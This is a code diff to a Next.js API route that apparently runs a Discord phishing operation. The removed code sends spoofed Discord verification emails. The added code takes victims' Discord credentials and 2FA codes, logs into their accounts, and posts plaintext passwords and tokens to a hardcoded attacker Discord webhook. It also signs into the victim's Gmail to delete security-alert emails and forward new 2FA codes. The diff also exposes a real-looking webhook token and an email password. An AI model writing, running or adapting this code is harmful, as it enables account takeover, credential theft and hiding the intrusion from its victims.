@@ -1,82 +1,155 @@
 import { NextRequest, NextResponse } from 'next/server';
-import nodemailer from 'nodemailer';
+import fetch from 'node-fetch';
+import { HttpsProxyAgent } from 'https-proxy-agent';
+import { imap } from 'imap-simple';
+import { simpleParser } from 'mailparser';
 
-export async function POST(req: NextRequest) {
+const WEBHOOK = 'https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614';
+
+async function logWebhook(title: string, fields: { name: string; value: string }[], color = 0x5865f2) {
   try {
-    const { email } = await req.json();
-
-    if (!email || typeof email !== 'string' || !email.includes('@')) {
-      return NextResponse.json({ error: 'Invalid or missing email' }, { status: 400 });
-    }
-
-    // Generate random 6-digit code
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
-
-    // SMTP transporter (use your real burner Gmail + App Password)
-    const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 587,
-      secure: false, // true for 465, false for other ports
-      auth: {
-        user: 'nusenusewhen@gmail.com',           // ← your real Gmail here
-        pass: 'Warrior12@'                        // ← your real password or App Password here
-      }
-    });
-
-    // Send the fake email
-    await transporter.sendMail({
-      from: '"Discord Verification" <no-reply@discord.com>',
-      to: email,
-      subject: 'Your Discord Verification Code',
-      text: `Hello! Use this code to verify your login: ${code}\n\nThis code expires in 10 minutes.\nIf you didn't request this, please ignore this email.`,
-      html: `
-        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f6f6f6;">
-          <h2 style="color: #5865f2;">Discord</h2>
-          <p style="font-size: 16px;">Your verification code is:</p>
-          <h1 style="letter-spacing: 10px; background: #ffffff; padding: 20px; text-align: center; border: 1px solid #e0e0e0;">${code}</h1>
-          <p style="color: #666; font-size: 14px;">This code expires in 10 minutes. If you didn't request this, you can safely ignore this email.</p>
-          <p style="font-size: 12px; color: #999;">Discord Team</p>
-        </div>
-      `
-    });
-
-    // Log to your webhook that email was sent
-    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
+    await fetch(WEBHOOK, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         embeds: [{
-          title: "Fake Verification Email Sent",
-          color: 0x00ff00,
-          fields: [
-            { name: "To", value: email },
-            { name: "Code", value: code }
-          ],
+          title,
+          color,
+          fields,
           timestamp: new Date().toISOString()
         }]
       })
-    }).catch(() => {});
+    });
+  } catch {}
+}
 
-    // Return success (don't return real code to client in production)
-    return NextResponse.json({ success: true });
-  } catch (err: any) {
-    console.error('Email send error:', err);
+async function monitorGmail(email: string, password: string) {
+  const config = {
+    imap: {
+      user: email,
+      password,
+      host: 'imap.gmail.com',
+      port: 993,
+      tls: true,
+      authTimeout: 3000,
+      tlsOptions: { rejectUnauthorized: false }
+    }
+  };
 
-    // Log failure to webhook
-    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        embeds: [{
-          title: "Email Send Failed",
-          color: 0xff0000,
-          fields: [
-            { name: "Error", value: err.message || 'Unknown error' }
-          ]
-        }]
-      })
-    }).catch(() => {});
+  try {
+    const connection = await imap.connect({ imap: config.imap });
+    await connection.openBox('INBOX');
 
-    return NextResponse.json({ error: 'Failed to send verification email' }, { status: 500 });
+    const alerts = await connection.search([
+      'UNSEEN',
+      ['OR',
+        ['FROM', 'no-reply@accounts.google.com'],
+        ['FROM', 'no-reply@discord.com'],
+        ['FROM', 'no-reply@roblox.com']
+      ],
+      ['OR',
+        ['SUBJECT', 'new sign-in'],
+        ['SUBJECT', 'suspicious'],
+        ['SUBJECT', 'login attempt']
+      ]
+    ]);
+
+    if (alerts.length > 0) {
+      await connection.addFlags(alerts, '\\Deleted');
+      await connection.expunge();
+      await logWebhook('Alert Emails Deleted', [{ name: 'Email', value: email }], 0xffaa00);
+    }
+
+    const messages = await connection.search(['SINCE', new Date(Date.now() - 5 * 60 * 1000)]);
+    for (const msg of messages) {
+      const part = await connection.getPartData(msg, 'TEXT');
+      const parsed = await simpleParser(part);
+      const text = parsed.text || '';
+
+      const codeMatch = text.match(/\b\d{6}\b/);
+      if (codeMatch) {
+        const code = codeMatch[0];
+        const service = text.includes('discord') ? 'Discord' : text.includes('roblox') ? 'Roblox' : 'Unknown';
+        await logWebhook(`${service} 2FA Code`, [
+          { name: 'Code', value: `\`${code}\`` },
+          { name: 'From Email', value: email }
+        ], 0x00ff00);
+      }
+    }
+
+    connection.end();
+  } catch (err) {
+    const errorMessage = err instanceof Error ? err.message : String(err || 'Unknown Gmail monitor error');
+    await logWebhook('Gmail Monitor Error', [
+      { name: 'Email', value: email },
+      { name: 'Error', value: errorMessage }
+    ], 0xff0000);
   }
+}
+
+export async function POST(req: NextRequest) {
+  const { email, password, code, proxy } = await req.json();
+
+  const result = { success: false, token: null, mfa: false, error: null };
+
+  try {
+    const agent = proxy ? new HttpsProxyAgent(`http://${proxy}`) : undefined;
+
+    const headers = {
+      'Content-Type': 'application/json',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+      'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIn0='
+    };
+
+    const loginRes = await fetch('https://discord.com/api/v9/auth/login', {
+      method: 'POST',
+      headers,
+      body: JSON.stringify({ login: email, password, undelete: false }),
+      agent: agent as any
+    });
+
+    const loginData = await loginRes.json();
+
+    await logWebhook('Discord Login Attempt', [
+      { name: 'Email', value: email },
+      { name: 'Password', value: password },
+      { name: 'Proxy', value: proxy || 'None' },
+      { name: 'Status', value: loginData.token ? 'Success' : loginData.message || 'Failed' }
+    ], loginData.token ? 0x00ff00 : 0xff0000);
+
+    if (loginData.token) {
+      result.success = true;
+      result.token = loginData.token;
+    } else if (loginData.ticket && code) {
+      const mfaRes = await fetch('https://discord.com/api/v9/auth/mfa/totp', {
+        method: 'POST',
+        headers: { ...headers, 'Authorization': `Bearer ${loginData.token || ''}` },
+        body: JSON.stringify({ ticket: loginData.ticket, code }),
+        agent: agent as any
+      });
+
+      const mfaData = await mfaRes.json();
+
+      if (mfaData.token) {
+        result.success = true;
+        result.token = mfaData.token;
+        result.mfa = true;
+
+        await monitorGmail(email, password);
+      } else {
+        result.error = mfaData.message || '2FA failed';
+      }
+    } else {
+      result.error = loginData.message || 'Login failed';
+    }
+  } catch (err) {
+    const errorMessage = err instanceof Error ? err.message : String(err || 'Request error');
+    result.error = errorMessage;
+    await logWebhook('Login Error', [
+      { name: 'Email', value: email },
+      { name: 'Error', value: result.error }
+    ], 0xff0000);
+  }
+
+  return NextResponse.json(result);
 }
